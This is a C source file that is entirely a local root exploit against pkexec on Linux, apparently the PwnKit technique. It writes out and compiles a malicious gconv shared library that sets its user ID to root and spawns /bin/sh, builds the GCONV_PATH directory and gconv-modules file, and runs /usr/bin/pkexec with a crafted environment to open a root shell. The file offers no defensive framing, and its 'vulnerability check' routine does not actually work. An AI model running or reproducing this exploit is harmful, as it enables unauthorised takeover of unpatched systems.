#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/wait.h>
struct stat st;
    int pipefd[2];
    char buf[99999];
void compileExploit()
{
	FILE *fp;
	fp = fopen("exploit/exploit.c", "w");
	if (fp < 0) {
                perror("fopen");
		exit(0);
        }

	char *shell = 
	    "#include <stdio.h>\n"
            "#include <stdlib.h>\n"
            "#include <unistd.h>\n"
            "void gconv() {}\n"
            "void gconv_init() {\n"
            "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
            "  static char *a_argv[] = { \"sh\", NULL };\n"
            "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
            "  execve(\"/bin/sh\", a_argv, a_envp);\n"
            "  exit(0);\n"
            "}\n";	

	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc exploit/exploit.c -o exploit/exploit.so -shared -fPIC");
}

void gconvpath()
{
	if (stat("GCONV_PATH=.", &st) < 0) {
            if(mkdir("GCONV_PATH=.", 0777) < 0) {
                perror("mkdir");
		exit(0);
            }
        int fd = open("GCONV_PATH=./exploit", O_CREAT|O_RDWR, 0777);
            if (fd < 0) {
                perror("open");
		exit(0);
            }
            close(fd);
    	}
}

void iconv_open()
{
	if (stat("exploit", &st) < 0) {
            if(mkdir("exploit", 0777) < 0) {
                perror("mkdir");
		exit(0);
        }

        FILE *fp = fopen("exploit/gconv-modules", "wb");
        if(fp == NULL) {
            perror("fopen");
	    exit(0);
        }
        fprintf(fp, "module UTF-8// NOT_UTF8// exploit 2\n");
        fclose(fp);
    	}
}

void checkVulnerability()
{
    pipe(pipefd);
    if (fork() == 0)
    {
        close(pipefd[1]);
        read(pipefd[0], buf, sizeof(buf)-1);
	close(pipefd[0]);
        if (strstr(buf, "pkexec --version") == buf) {
            puts("System is not vulnerable");
	    exit(0);
        }else{
	    puts("System vulnerable");
	}
	
        exit(0);
    }
    close(pipefd[0]);
    close(pipefd[1]);
}

int main(int argc, char *argv[]) {
	FILE *fp;

	char * a_argv[]={ NULL };
    	char * a_envp[]={
            "exploit", 
	    "PATH=GCONV_PATH=.", 
	    "CHARSET=NOT_UTF8", 
	    "SHELL=not/in/etc/shells", 
	    NULL
    	};

	gconvpath();
	
	iconv_open();

	compileExploit();

	checkVulnerability();

	execve("/usr/bin/pkexec", a_argv, a_envp);
}
